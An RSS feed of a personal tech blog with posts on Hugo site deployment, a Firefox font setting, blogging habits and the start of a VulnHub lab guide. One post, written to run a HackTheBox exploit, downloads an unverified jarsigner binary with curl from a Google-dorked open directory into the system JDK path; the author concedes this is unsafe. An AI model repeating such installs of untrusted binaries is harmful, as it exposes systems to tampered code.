<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Blog on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/blog/</link>
    <description>Recent content in Blog on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Mon, 24 May 2021 19:58:39 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/blog/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Install jarsigner without Java SDK in Kali Linux</title>
      <link>https://fahmifj.github.io/blog/install-jar-signer-without-java-sdk/</link>
      <pubDate>Mon, 14 Jun 2021 14:41:04 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/install-jar-signer-without-java-sdk/</guid>
      <description>The PoC exploit of ScriptKiddie from HackTheBox actually requires a binary that is known as jarsigner . The binary itself is bundled with the Java SDK and my Kali Linux definitely has it, so I should have that binary installed.
However, I was unable to locate this jarsigner on my machine.
I started to look for it on the internet, simply because I didn&amp;rsquo;t want to reinstall the Java JDK on my machine just to get this single binary file, which could potentially mess up the current system/apps installed.</description>
      <content:encoded><![CDATA[<p>The PoC exploit of <a href="https://fahmifj.github.io/writeups/hackthebox/htb-scriptkiddie/">ScriptKiddie</a> from HackTheBox actually requires a binary that is known as <code>jarsigner</code> . The binary itself is bundled with the Java SDK and my Kali Linux definitely has it, so I should have that binary installed.</p>
<p>However, I was unable to locate  this <code>jarsigner</code> on my machine.</p>
<p>I started to look for it on the internet, simply because I didn&rsquo;t want to reinstall the Java JDK on my machine just to get this single binary file, which could potentially mess up the current system/apps installed.</p>
<p>And guess what? The search result that showed up was a bunch of documentation about how to use that binary.</p>
<h3 id="in-search-of-the-missing-binary---google-dork">In search of the missing binary - Google dork</h3>
<p>Fortunately, I discovered some sites that provided the single binary I needed using Google dorks.</p>
<pre><code>intitle:&quot;index of /&quot; bin jarsigner
</code></pre><p>I end up on this <a href="http://www.citrucoop.es/jdk-11.0.6/bin/">site</a>:</p>
<p><div class="img-container"><img src="imgs/image-20210614151715867.png" alt="image-20210614151715867"  /></div>
</p>
<p>I have the binary, but it can not be used with the exploit tool by simply putting the binary on my Java PATH.</p>
<h3 id="installing-jarsigner">Installing jarsigner</h3>
<p>It turns out that <a href="https://discuss.getsol.us/d/4656-java-command-unknown-after-update">Java binary</a> needs to be &lsquo;symlinked&rsquo;.</p>
<p>So, first, I&rsquo;ll have to find out where is my Java binary located.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ls -l <span style="color:#66d9ef">$(</span>which java<span style="color:#66d9ef">)</span>
lrwxrwxrwx <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">22</span> Nov <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2019</span> /usr/bin/java -&gt; /etc/alternatives/java
$ ls -l /etc/alternatives/java
lrwxrwxrwx <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">43</span> Nov <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2019</span> /etc/alternatives/java -&gt; /usr/lib/jvm/java-11-openjdk-amd64/bin/java
</code></pre></div><p>I&rsquo;ll grab the <code>jarsigner</code> binary from the site and drop it directly under <code>/usr/lib/jvm/java-11-openjdk-amd64/bin/</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ curl -s http://www.citrucoop.es/jdk-11.0.6/bin/jarsigner &gt; /usr/lib/jvm/java-11-openjdk-amd64/bin/jarsigner
</code></pre></div><p>Then, I&rsquo;ll make a symlink of <code>jarsigner</code> at <code>/usr/bin/</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ cd /usr/bin
$ ln -sf /usr/lib/jvm/java-11-openjdk-amd64/bin/jarsigner jarsigner
</code></pre></div><p>It&rsquo;s working now fine.</p>
<p><em>Hold up.. isn&rsquo;t it unsafe?</em> ü§î</p>
<p>Absolutely! üòÖ so don&rsquo;t ever do this if you don&rsquo;t trust the site.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Hugo Setup and Deployment</title>
      <link>https://fahmifj.github.io/blog/hugo-setup-and-deployment/</link>
      <pubDate>Sun, 13 Jun 2021 11:12:48 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/hugo-setup-and-deployment/</guid>
      <description>A quick tutorial about setting up a site using Hugo</description>
      <content:encoded><![CDATA[<p>Looking back at my first post, I said that I was using Hugo to build this blog. So in this post, I‚Äôll share how to create your own!</p>
<h3 id="goals">Goals</h3>
<p>Below are the main goals of this post:</p>
<ul>
<li>Installing Hugo</li>
<li>Using Hugo theme</li>
<li>Deploying Hugo site with Github</li>
</ul>
<h3 id="prerequisites">Prerequisites</h3>
<p>There are some prerequisites needed to accomplish these goals:</p>
<ul>
<li>A GitHub account</li>
<li><a href="https://git-scm.com/downloads">Git Bash</a> for Windows users</li>
<li>Basics knowledge of Git (commit, push, pull, creating repository, know what is local and remote repository)</li>
<li>Basics knowledge/use of CLI (cd, ls, pwd, mv, rm, mkdir)</li>
</ul>
<p>If all set, then let&rsquo;s get started</p>
<h2 id="01-installing-hugo">01. Installing Hugo</h2>
<p>First, download Hugo executable binary at:</p>
<ul>
<li><a href="https://github.com/gohugoio/hugo/releases">https://github.com/gohugoio/hugo/releases</a></li>
</ul>
<p>Pick your Hugo version according to what OS you‚Äôre on. There is also the extended version, which you should use if you‚Äôre building your own theme or picking a theme that uses Sass/SCSS.</p>
<p>I will assume that you have downloaded the binary and extracted it somewhere on your system.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$ ls -l
total 47488
-rw-r--r-- 1 Fahmi FJ 197121    11357 Mar 22 00:17 LICENSE
-rw-r--r-- 1 Fahmi FJ 197121    12345 Mar 22 00:17 README.md
-rwxr-xr-x 1 Fahmi FJ 197121 48599040 Mar 22 01:04 hugo.exe
</code></pre></div><p>Let&rsquo;s test it on terminal by typing:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$ hugo.exe version
hugo v0.82.0-9D960784+extended windows/amd64 BuildDate=2021-03-21T17:28:04Z VendorInfo=gohugoio
</code></pre></div><p>At this time, Hugo‚Äôs binary is not available in a system-wide (it‚Äôs not accessible outside the current directory).</p>
<p>So, let&rsquo;s make it accessible from anywhere by adding the binary location to what is known as <a href="https://en.wikipedia.org/wiki/Environment_variable">PATH variable</a>.</p>
<h3 id="011-windows">01.1. Windows</h3>
<p>For Windows users, let&rsquo;s create a folder called <code>bin</code> in <code>C:/</code> .</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\&gt;mkdir bin
</code></pre></div><p>Once the folder is created, move your Hugo binary into it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\&gt;dir bin
 Volume in drive C is Windows
 Volume Serial Number is AC06-7D93

 Directory of C:\bin

13/06/2021  08:07    &lt;DIR&gt;          .
13/06/2021  08:07    &lt;DIR&gt;          ..
22/03/2021  01:04        48.599.040 hugo.exe
               1 File(s)     48.599.040 bytes
               2 Dir(s)  57.909.837.824 bytes free
</code></pre></div><p>Hit <code>Win + R</code> on your keyboard, then type:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">rundll32.exe sysdm.cpl,EditEnvironmentVariables
</code></pre></div><p>You should see a window with &ldquo;Environment Variables&rdquo; in the title. We&rsquo;re going to edit <code>Path</code> variable, select that <code>Path</code> variable and click on <strong>Edit</strong> button.</p>
<p><div class="img-container"><img src="imgs/image-20210613081626397.png" alt="image-20210613081626397"  /></div>
</p>
<p>On the Edit window, click on <strong>New</strong> button to add a new path and type <code>C:\bin</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210613082450289.png" alt="image-20210613082450289"  /></div>
</p>
<p>After that, just hit all the <strong>OK</strong> button.</p>
<p>Open your Windows terminal and run <code>hugo version</code>. If it returns the same output as previous one, then go to the section 02.</p>
<h3 id="012-linux">01.2. Linux</h3>
<blockquote>
<p>I know those who uses Linux probably already know how to üòÅ.</p>
</blockquote>
<p>For Linux users, let&rsquo;s create a folder called <code>bin</code> under <code>/home/username/.local/[here]</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$ mkdir -p ~/.local/bin
</code></pre></div><p>Open your <code>.bashrc</code> or <code>.zshrc</code> file, it is located at <code>/home/username/.[zsh|bash]rc</code>, with your favorite text editor such as vim and simply add this line at the top of your <code>.bashrc/.zshrc</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">PATH_HUGO=&#39;/home/username/.local/bin&#39;
export PATH=$PATH_HUGO:$PATH
</code></pre></div><p>Reopen your terminal and run <code>hugo version</code> from any directory and see if it&rsquo;s returns the version.</p>
<h2 id="02-creating-your-first-site">02. Creating Your First Site</h2>
<p>We can create a site from anywhere by issuing the following command:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$ hugo new site [site-name]
</code></pre></div><blockquote>
<p>I recommend you to create a site in a specific folder such as <code>workspace</code>.</p>
</blockquote>
<p>For now, let&rsquo;s create a site called <code>my-blog</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$ hugo new site my-blog
Congratulations! Your new Hugo site is created in C:\Users\fahmi\Desktop\test\my-blog.

Just a few more steps and you&#39;re ready to go:

1. Download a theme into the same-named folder.
   Choose a theme from https://themes.gohugo.io/ or
   create your own with the &#34;hugo new theme &lt;THEMENAME&gt;&#34; command.
2. Perhaps you want to add some content. You can add single files
   with &#34;hugo new &lt;SECTIONNAME&gt;\&lt;FILENAME&gt;.&lt;FORMAT&gt;&#34;.
3. Start the built-in live server via &#34;hugo server&#34;.

Visit https://gohugo.io/ for quickstart guide and full documentation.
</code></pre></div><p>You can see that Hugo creates a new folder called  <code>my-blog</code> at <code>C:\Users\fahmi\Desktop\test\my-blog</code>, and <code>my-blog</code> has the following directory structure:</p>
<pre><code>my-blog
‚îú‚îÄ‚îÄ archetypes
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ default.md
‚îú‚îÄ‚îÄ config.toml
‚îú‚îÄ‚îÄ content
‚îú‚îÄ‚îÄ data
‚îú‚îÄ‚îÄ layouts
‚îú‚îÄ‚îÄ static
‚îî‚îÄ‚îÄ themes
</code></pre><p>We can host the site locally (localhost) by typing <code>hugo server</code> in the terminal.</p>
<pre><code>$ cd my-blog
$ hugo server
</code></pre><p>By default, the site is hosted at <code>http://localhost:1313/</code> , but it&rsquo;s still empty because we haven&rsquo;t added any content yet.</p>
<h2 id="03-installing-hugo-theme">03. Installing Hugo Theme</h2>
<p>My blog uses a theme called <a href="https://themes.gohugo.io/hugo-papermod/">PaperMod</a>, so l&rsquo;ll be using that too here. But, first, let&rsquo;s delete the previous <code>my-blog</code> and recreate it with the following command:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$ hugo new site my-blog -f yml
</code></pre></div><p>Let&rsquo;s move into <code>my-blog</code> and initialize a git repository there.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$ cd my-blog
$ git init
</code></pre></div><p>After that,  go to the <code>themes</code> folder and clone the PaperMod theme there.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$ cd themes
$ git clone https://github.com/adityatelange/hugo-PaperMod PaperMod --depth=1
</code></pre></div><p>We&rsquo;ll add the theme as a submodule <code>my-blog</code>.</p>
<pre><code>$ git submodule add https://github.com/adityatelange/hugo-PaperMod.git PaperMod
</code></pre><p>Now, let&rsquo;s go back to the root directory (<code>my-blog</code>), then replace/overwrite our <code>config.yml</code> with <a href="https://raw.githubusercontent.com/adityatelange/hugo-PaperMod/exampleSite/config.yml">this</a>, but change the value of <code>baseUrl</code> and <code>theme</code> to this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">baseURL: &#34;&#34;
theme: PaperMod
</code></pre></div><p>Test it with:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$ hugo server
</code></pre></div><h2 id="04-creating-your-first-post">04. Creating Your First Post</h2>
<p>We can create a new post with by issuing the following command:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$ hugo new post/new-post.md
</code></pre></div><p>You can edit <code>new-post.md</code> after that, the file should be under <code>my-blog/content/post/[here]</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$ ls -l my-blog/content/post/
total 1
-rw-r--r-- 1 Fahmi FJ 197121 70 Jun 13 09:34 my-post.md
</code></pre></div><p>To see your post in the site, change the value <code>draft</code> from <code>true</code> to <code>false</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">---
title: &#34;My Post&#34;
date: 2021-06-13T09:34:43+07:00
draft: false
---

My first post
</code></pre></div><p>It should be on your site now.</p>
<h2 id="05-deploying-site-on-github">05. Deploying Site on GitHub</h2>
<p>From here, need to know that when you run <code>hugo server</code>, Hugo will generate all the site resources and serve them from memory. But, if you run <code>hugo</code>, Hugo will generates all the site resources inside <code>public</code> folder (<code>my-blog/public/[here]</code>).</p>
<p>The files in this <code>public</code> folder are the files that we are going to host on GitHub. We can simply upload all the files in the <code>public</code> folder into a GitHub repository.</p>
<p>I&rsquo;m not good at explaining it on English, so let&rsquo;s do that in action!</p>
<p>But, before that, you have to change your site&rsquo;s <strong>base URL</strong> in <code>config.yml</code> to:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">baseURL: &#34;https://[your_user_name].github.io/my-blog/&#34;
</code></pre></div><p>For example, my username is <code>fahmifj</code> , so my config would be:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">baseURL: &#34;https://fahmifj.github.io/my-blog/&#34;
</code></pre></div><p>Once you done that, type <code>hugo</code> at the site root directory, Hugo will re-generates the web files at the <code>public</code> folder.</p>
<pre><code>$ hugo
Start building sites ‚Ä¶

                   | EN | FR | FA
-------------------+----+----+-----
  Pages            | 14 | 10 | 10
  Paginator pages  |  0 |  0 |  0
  Non-page files   |  0 |  0 |  0
  Static files     |  0 |  0 |  0
  Processed images |  0 |  0 |  0
  Aliases          |  3 |  0 |  1
  Sitemaps         |  2 |  1 |  1
  Cleaned          |  0 |  0 |  0

Total in 147 ms
</code></pre><p>After that, <a href="https://docs.github.com/en/github/getting-started-with-github/quickstart/create-a-repo">create a new repository</a> called <code>my-blog</code> on GitHub.</p>
<p>Once the repo is created, click on <strong>Upload an existing file</strong>.</p>
<p><div class="img-container"><img src="imgs/image-20210613095820873.png" alt="image-20210613095820873"  /></div>
</p>
<p>Then simply drag and drop all the files from the <code>public</code> folder there.</p>
<p><div class="img-container"><img src="imgs/image-20210613095945135.png" alt="image-20210613095945135"  /></div>
</p>
<p>Once all the files is uploaded, commit the changes, I&rsquo;ll leave the commit message as default.</p>
<p><div class="img-container"><img src="imgs/image-20210613101009392.png" alt="image-20210613101009392"  /></div>
</p>
<p>After that, go the GitHub pages settings at <code>https://github.com/your-username/my-blog/settings/pages</code> to host your site.</p>
<p><div class="img-container"><img src="imgs/image-20210613101748114.png" alt="image-20210613101748114"  /></div>
</p>
<p>There you go!</p>
<p><div class="img-container"><img src="imgs/image-20210613101715896.png" alt="image-20210613101715896"  /></div>
</p>
<p>If you don&rsquo;t see your site there or it returns a 404 error, just wait for a few minutes more.</p>
<p>From here, we learned how to deploy/host our Hugo site on GitHub. However, this is not an efficient method of updating your site, therefore let&rsquo;s write a deployment script.</p>
<h2 id="06-deployment-script">06. Deployment Script</h2>
<p>Assuming you&rsquo;re inside <code>my-blog</code> , then go to the <code>public</code> directory, do files and folders clean up then initialize a git repository there.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$ cd public
$ rm -rf *
$ git init
</code></pre></div><p>Still inside the <code>public</code> directory, set the previously created <code>my-blog</code> repository as the remote repository and run <code>git pull</code> afterwards.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$ git remote add origin https://github.com/your-username/my-blog.git
$ git pull origin main
</code></pre></div><p>Return to the site root directory then add the <code>public</code> folder as a submodule.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$ cd ../
$ git submodule add https://github.com/your-username/my-blog.git public
</code></pre></div><p>Now let&rsquo;s create a deployment script at the site root directory and name it as <code>deploy.sh</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>
echo -e <span style="color:#e6db74">&#34;\033[0;32mDeploying blog to GitHub...\033[0m&#34;</span>

<span style="color:#75715e"># Clean public folder</span>
hugo --cleanDestinationDir

<span style="color:#75715e"># Go to to public folder</span>
cd public/

<span style="color:#75715e"># Add untracked files, hide output</span>
git add -A &gt; /dev/null

<span style="color:#75715e"># Generate a fixed commit message with date and time</span>
msg<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;[`date &#34;</span>+%R %d-%h-%Y<span style="color:#e6db74">&#34;]` Site update&#34;</span>
	
<span style="color:#75715e"># Check for additional commit message</span>
read -p <span style="color:#e6db74">&#34;Add commit message: &#34;</span> add_msg
<span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$add_msg<span style="color:#e6db74">&#34;</span> !<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">]</span>
	<span style="color:#66d9ef">then</span> 
	msg<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$msg<span style="color:#e6db74"> - </span>$add_msg<span style="color:#e6db74">&#34;</span>
<span style="color:#66d9ef">fi</span>

git commit -m <span style="color:#e6db74">&#34;</span>$msg<span style="color:#e6db74">&#34;</span>

<span style="color:#75715e"># Deploy</span>
git push -u origin main

<span style="color:#75715e"># Go back to the root directory</span>
cd ../
</code></pre></div><p>In Windows, even though it is a bash script, it will work with Git Bash.</p>
<p>Let&rsquo;s test it by creating a new post.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$ hugo new post/second-post.md
$ echo &#39;This is second post&#39; &gt;&gt; content/post/second-post.md
</code></pre></div><p>Don&rsquo;t forget to change the value of <code>draft</code>  from <code>true</code> to <code>false</code>!</p>
<p>Now we can run the script, the output should looks something like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">(</span>my-blog<span style="color:#f92672">)</span>$ ./deploy.sh
Deploying blog to GitHub...
Start building sites ‚Ä¶

                   | EN | FR | FA
-------------------+----+----+-----
  Pages            | <span style="color:#ae81ff">15</span> | <span style="color:#ae81ff">10</span> | <span style="color:#ae81ff">10</span>
  Paginator pages  |  <span style="color:#ae81ff">0</span> |  <span style="color:#ae81ff">0</span> |  <span style="color:#ae81ff">0</span>
  Non-page files   |  <span style="color:#ae81ff">0</span> |  <span style="color:#ae81ff">0</span> |  <span style="color:#ae81ff">0</span>
  Static files     |  <span style="color:#ae81ff">0</span> |  <span style="color:#ae81ff">0</span> |  <span style="color:#ae81ff">0</span>
  Processed images |  <span style="color:#ae81ff">0</span> |  <span style="color:#ae81ff">0</span> |  <span style="color:#ae81ff">0</span>
  Aliases          |  <span style="color:#ae81ff">3</span> |  <span style="color:#ae81ff">0</span> |  <span style="color:#ae81ff">1</span>
  Sitemaps         |  <span style="color:#ae81ff">2</span> |  <span style="color:#ae81ff">1</span> |  <span style="color:#ae81ff">1</span>
  Cleaned          |  <span style="color:#ae81ff">0</span> |  <span style="color:#ae81ff">0</span> |  <span style="color:#ae81ff">0</span>

Total in <span style="color:#ae81ff">155</span> ms
Add commit message:
<span style="color:#f92672">[</span>main af4c483<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>11:00 13-Jun-2021<span style="color:#f92672">]</span> Site update
 <span style="color:#ae81ff">9</span> files changed, <span style="color:#ae81ff">459</span> insertions<span style="color:#f92672">(</span>+<span style="color:#f92672">)</span>, <span style="color:#ae81ff">8</span> deletions<span style="color:#f92672">(</span>-<span style="color:#f92672">)</span>
 create mode <span style="color:#ae81ff">100644</span> post/second-post/index.html
Enumerating objects: 27, <span style="color:#66d9ef">done</span>.
Counting objects: 100% <span style="color:#f92672">(</span>27/27<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
Delta compression using up to <span style="color:#ae81ff">8</span> threads
Compressing objects: 100% <span style="color:#f92672">(</span>13/13<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
Writing objects: 100% <span style="color:#f92672">(</span>15/15<span style="color:#f92672">)</span>, 3.54 KiB | 1.77 MiB/s, <span style="color:#66d9ef">done</span>.
Total <span style="color:#ae81ff">15</span> <span style="color:#f92672">(</span>delta 9<span style="color:#f92672">)</span>, reused <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>delta 0<span style="color:#f92672">)</span>, pack-reused <span style="color:#ae81ff">0</span>
remote: Resolving deltas: 100% <span style="color:#f92672">(</span>9/9<span style="color:#f92672">)</span>, completed with <span style="color:#ae81ff">7</span> local objects.
To https://github.com/fahmifj/my-blog.git
   f7141a3..af4c483  main -&gt; main
Branch <span style="color:#e6db74">&#39;main&#39;</span> set up to track remote branch <span style="color:#e6db74">&#39;main&#39;</span> from <span style="color:#e6db74">&#39;origin&#39;</span>.
</code></pre></div><p>It gets updated.</p>
<p><div class="img-container"><img src="imgs/image-20210613110105343.png" alt="image-20210613110105343"  /></div>
</p>
<p>That&rsquo;s how I deployed my blog at the first time.</p>
<p>But still, this is inefficient method because it wastes your bandwidth, thus in the next post, let&rsquo;s employ GitHub action üòº.</p>
<p>In the meantime, try reading the following documentation:</p>
<ul>
<li><a href="https://gohugo.io/content-management/sections/">https://gohugo.io/content-management/sections/</a></li>
<li><a href="https://gohugo.io/content-management/front-matter/">https://gohugo.io/content-management/front-matter/</a></li>
<li><a href="https://gohugo.io/content-management/page-bundles/">https://gohugo.io/content-management/page-bundles/</a></li>
<li><a href="https://gohugo.io/content-management/urls/">https://gohugo.io/content-management/urls/</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>About Nano Blogs</title>
      <link>https://fahmifj.github.io/blog/about-nano-blogs/</link>
      <pubDate>Fri, 11 Jun 2021 13:07:13 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/about-nano-blogs/</guid>
      <description>Just my cognitive dissonance</description>
      <content:encoded><![CDATA[<p>This blog has been up for about two months (or about a year on Medium). I&rsquo;m quite satisfied with what I&rsquo;ve written so far, even though some of them have only 10 viewersüòÖ.</p>
<p>As someone who constantly takes notes on almost everything I learn, I thought it would be fun to share these notes, particularly on IT/Cyber Security topics, on my blog, but I was wrong; it&rsquo;s not as simple as I thought the first time. Converting those notes into a proper article structure has left me feeling overwhelmed, especially in the introduction section üòÖ.</p>
<p>And recently, I&rsquo;ve had a few people reach me about featuring my article/post in their publication. I&rsquo;m happy with that because my posts can reach a broader audience, but, at the same time, I have started to worry about my writing, especially the grammar.</p>
<p>To get over that insecurity, I had to review my post more than 2 times, check the sentence&rsquo;s structure, translate it ID-EN, and other things that would make it look just right, at least for me. I know this would improve my English, but still, it&rsquo;s not an easy task to do and it takes more time now to just write one post where I still have a lot of things I want to share.</p>
<p>I have a lot of notes and it keeps increasing day by day:</p>
<p><div class="img-container"><img src="imgs/image-20210611140231107.png" alt="image-20210611140231107"  /></div>
</p>
<p>Not to mention that there are some untouched drafts in my Medium.</p>
<p>After reflecting on my first objective of starting a blog and realizing that I&rsquo;m an amateur writer who doesn&rsquo;t aim for publication, but to share my notes and preserve my experiences, I decided to &lsquo;ignore&rsquo; publication for now and start with something called a bite-sized post/article which is short and to-the-point post (CTF write-ups are excluded üòÇ).</p>
<p>With that I hope I could turn my notes into a blog post quickly without worrying too much about grammar.</p>
<p>Well, it&rsquo;s not that I don&rsquo;t need a publication; I&rsquo;m totally fine increasing my audience from publication, which without a doubt motivates me to write more. But that&rsquo;s not my priority right now, and, after all, I&rsquo;m just an amateur who blogs as a hobby.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Font Smoothing in Firefox</title>
      <link>https://fahmifj.github.io/blog/font-smoothing-in-firefox/</link>
      <pubDate>Sun, 06 Jun 2021 22:08:49 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/font-smoothing-in-firefox/</guid>
      <description>For Web development, I prefer Firefox, particularly I like the right-click + Q shortcut for inspecting elements. However, there is one issue that bothers me/my eyes.
It&amp;rsquo;s the font smoothing!
Somehow, Firefox renders fonts as if it&amp;rsquo;s in high contrast mode or without anti-alias. So in this post, I&amp;rsquo;ll share what I&amp;rsquo;ve found as a workaround to &amp;lsquo;fix&amp;rsquo; that.
Open Firefox and type about:config in the address bar.
 Search for this string.</description>
      <content:encoded><![CDATA[<p>For Web development, I prefer Firefox, particularly I like the right-click + Q shortcut for inspecting elements. However, there is one issue that bothers me/my eyes.</p>
<p>It&rsquo;s the font smoothing!</p>
<p>Somehow, Firefox renders fonts as if it&rsquo;s in high contrast mode or without anti-alias. So in this post, I&rsquo;ll share what I&rsquo;ve found as a workaround to &lsquo;fix&rsquo; that.</p>
<p>Open Firefox and type <code>about:config</code> in the address bar.</p>
<p><div class="img-container"><img src="imgs/image-20210606221033823.png" alt="image-20210606221033823"  /></div>
</p>
<p>Search for this string.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gfx.font_rendering.cleartype_params.enhanced_contrast
</code></pre></div><p>Change the value to 0.</p>
<p><div class="img-container"><img src="imgs/image-20210606221107000.png" alt="image-20210606221107000"  /></div>
</p>
<p>Result üîΩ</p>
<p><div class="img-container"><img src="imgs/image-20210607074639032.png" alt="image-20210607074639032"  /></div>
</p>
<p>It&rsquo;s not that smooth like in Chrome, but a little bit better üò∫.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Setup VulnHub Machines</title>
      <link>https://fahmifj.github.io/blog/setup-vulnhub-machines/</link>
      <pubDate>Mon, 31 May 2021 03:56:18 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/setup-vulnhub-machines/</guid>
      <description>Get started with boot2root using VulnHub machines. It&amp;#39;s free and explorable!</description>
      <content:encoded><![CDATA[<p>In this post, I would like to share a quick tutorial (I guess) on how to setup a VulnHub machine in your local network. I‚Äôll assume that you are already familiar with software installation, know what Host OS-Guest OS is, and IP address.</p>
<h2 id="what-is-vulnhub">What is VulnHub?</h2>
<p>VulnHub is a website that provides vulnerable virtual machines (VMs) for those who wants to gain a practical experience in penetration testing. It similar with Hack The Box and TryHackMe, but with VulnHub you can practice locally. Because Windows machine requires a license, most VulnHub machines are Linux server.</p>
<p>There are a lot of things you can do with VulnHub machines after you get a root, such as:</p>
<ul>
<li>Analyzing  the vulnerability, sometimes I patch it if it‚Äôs just an insecure code line.</li>
<li>Learning how the author configure the server.</li>
<li>Building a pentest lab that consist of VulnHub machines to practice network pivoting.</li>
<li>DFIR, and many more!</li>
</ul>
<p>Let&rsquo;s jump in!</p>
<h2 id="01-install-your-virtualization-software">01. Install your virtualization software</h2>
<p>First thing first, you need a virtualization software such as VirtualBox or VMWare. Here is the links for both software:</p>
<ul>
<li>VirtualBox - <a href="https://www.virtualbox.org/wiki/Downloads">https://www.virtualbox.org/wiki/Downloads</a></li>
